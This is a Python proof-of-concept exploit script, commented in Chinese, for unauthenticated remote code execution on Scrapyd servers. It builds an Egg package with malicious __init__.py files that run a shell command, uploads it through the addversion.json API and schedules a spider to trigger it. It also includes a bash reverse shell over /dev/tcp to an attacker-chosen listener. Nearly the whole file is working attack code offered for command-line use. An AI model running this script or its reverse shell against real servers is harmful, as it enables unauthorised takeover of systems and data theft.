#!/usr/bin/env python3
"""
Scrapyd Unauthenticated RCE POC
漏洞原理：Scrapyd 默认未开启认证，可通过 API 上传恶意 Egg 包并调度爬虫执行代码。
用法: python3 scrapyd_rce.py --target http://192.168.1.100:6800 --cmd "touch /tmp/pwned"
      python3 scrapyd_rce.py --target http://192.168.1.100:6800 --lhost 10.0.0.1 --lport 4444
"""

import os
import sys
import argparse
import tempfile
import zipfile
import requests
import random
import string
import time

# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings()

class ScrapydRCE:
    def __init__(self, base_url, timeout=10):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False

    def _gen_project_name(self):
        return "evil_" + ''.join(random.choices(string.ascii_lowercase, k=6))

    def _create_egg(self, project_name, payload_code):
        """
        创建符合 Scrapy 项目结构的 Egg 包（zip格式）
        包含：
          - EGG-INFO/ 目录（可留空或包含基本元数据）
          - {project_name}/__init__.py （恶意代码）
          - {project_name}/spiders/__init__.py （空，但必须存在以识别为Scrapy项目）
          - 可选 scrapy.cfg
        """
        tmpdir = tempfile.mkdtemp()
        egg_path = os.path.join(tmpdir, f"{project_name}.egg")

        # 项目目录
        proj_dir = os.path.join(tmpdir, project_name)
        os.makedirs(proj_dir, exist_ok=True)
        spiders_dir = os.path.join(proj_dir, "spiders")
        os.makedirs(spiders_dir, exist_ok=True)

        # 写入恶意 __init__.py（项目根和spiders下各写一个，保证无论哪个先加载都执行）
        malicious_code = f"""
import subprocess, os
def execute():
    try:
        subprocess.Popen("{payload_code}", shell=True)
    except Exception as e:
        with open("/tmp/scrapyd_rce_err.log", "a") as f:
            f.write(str(e))
execute()
"""
        # 项目根 __init__.py
        with open(os.path.join(proj_dir, "__init__.py"), "w") as f:
            f.write(malicious_code)
        # spiders __init__.py
        with open(os.path.join(spiders_dir, "__init__.py"), "w") as f:
            f.write(malicious_code)
        # 可选的 scrapy.cfg（某些版本可能要求）
        with open(os.path.join(tmpdir, "scrapy.cfg"), "w") as f:
            f.write(f"[settings]\ndefault = {project_name}.settings\n")
            f.write(f"[deploy]\nproject = {project_name}\n")

        # 打包成 zip（egg）
        with zipfile.ZipFile(egg_path, 'w', zipfile.ZIP_DEFLATED) as egg:
            # 添加 EGG-INFO 目录（可为空）
            egg.writestr("EGG-INFO/", "")
            # 添加项目文件
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, tmpdir)
                    if arcname == os.path.basename(egg_path):
                        continue
                    egg.write(full_path, arcname)
        print(f"[+] 恶意 Egg 已创建: {egg_path}")
        return egg_path, tmpdir

    def upload_egg(self, project, version, egg_path):
        """通过 addversion.json 上传 Egg"""
        url = f"{self.base_url}/addversion.json"
        with open(egg_path, 'rb') as f:
            files = {
                'project': (None, project),
                'version': (None, version),
                'egg': (os.path.basename(egg_path), f, 'application/octet-stream')
            }
            try:
                resp = self.session.post(url, files=files, timeout=self.timeout)
                data = resp.json()
                if data.get("status") == "ok":
                    print(f"[+] 上传成功: {project} v{version}")
                    return True
                else:
                    print(f"[-] 上传失败: {data}")
                    return False
            except Exception as e:
                print(f"[-] 上传请求异常: {e}")
                return False

    def list_projects(self):
        """列出所有项目，确认上传成功"""
        url = f"{self.base_url}/listprojects.json"
        try:
            resp = self.session.get(url, timeout=self.timeout)
            return resp.json().get("projects", [])
        except:
            return []

    def list_spiders(self, project):
        """列出项目中的所有爬虫"""
        url = f"{self.base_url}/listspiders.json"
        params = {"project": project}
        try:
            resp = self.session.get(url, params=params, timeout=self.timeout)
            return resp.json().get("spiders", [])
        except:
            return []

    def schedule_spider(self, project, spider):
        """调度执行爬虫，触发恶意代码"""
        url = f"{self.base_url}/schedule.json"
        data = {"project": project, "spider": spider}
        try:
            resp = self.session.post(url, data=data, timeout=self.timeout)
            result = resp.json()
            if result.get("status") == "ok":
                print(f"[+] 任务已调度: {result.get('jobid')}")
                return True
            else:
                print(f"[-] 调度失败: {result}")
                return False
        except Exception as e:
            print(f"[-] 调度请求异常: {e}")
            return False

    def exploit(self, command, lhost=None, lport=None):
        # 生成 payload
        if lhost and lport:
            # 反弹 shell (使用 /bin/bash)
            payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            print(f"[*] 使用反弹 Shell: {lhost}:{lport}")
        else:
            # 执行指定命令
            payload = command
            print(f"[*] 执行命令: {command}")

        project = self._gen_project_name()
        version = str(int(time.time()))  # 使用时间戳作为版本号
        egg_path, tmpdir = self._create_egg(project, payload)

        # 上传
        if not self.upload_egg(project, version, egg_path):
            print("[-] 上传失败，退出")
            # 清理
            os.unlink(egg_path)
            os.rmdir(tmpdir)
            return False

        # 列出项目，确认存在
        projects = self.list_projects()
        if project not in projects:
            print("[-] 上传后未在项目列表中发现该项目，可能失败")
            return False

        print(f"[+] 确认项目 '{project}' 已存在")

        # 列出爬虫（由于我们没有定义实际 spider，可能为空，但仍尝试触发）
        spiders = self.list_spiders(project)
        if not spiders:
            print("[*] 未检测到 spider，尝试以项目名作为 spider 名称调度（可能失败）")
            spiders = ["spider_default"]  # 尝试一个占位名，实际可能报错但已加载模块？

        # 尝试调度每个 spider，触发 __init__.py 执行（导入模块时就会执行恶意代码）
        for spider in spiders:
            self.schedule_spider(project, spider)

        # 清理临时文件
        os.unlink(egg_path)
        for root, dirs, files in os.walk(tmpdir, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir(tmpdir)

        print("[✔] 完成，请检查命令执行结果")
        return True


def main():
    parser = argparse.ArgumentParser(description="Scrapyd Unauthenticated RCE POC")
    parser.add_argument("--target", required=True, help="目标 Scrapyd 地址，如 http://192.168.1.100:6800")
    parser.add_argument("--cmd", default="touch /tmp/pwned", help="要执行的系统命令（默认: touch /tmp/pwned）")
    parser.add_argument("--lhost", help="反弹 Shell 监听地址")
    parser.add_argument("--lport", type=int, help="反弹 Shell 监听端口")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时时间")
    args = parser.parse_args()

    if args.lhost and args.lport:
        command = None
    else:
        command = args.cmd
        if not command:
            print("[-] 必须指定 --cmd 或同时指定 --lhost --lport")
            sys.exit(1)

    poc = ScrapydRCE(args.target, timeout=args.timeout)
    poc.exploit(command=command, lhost=args.lhost, lport=args.lport)


if __name__ == "__main__":
    main()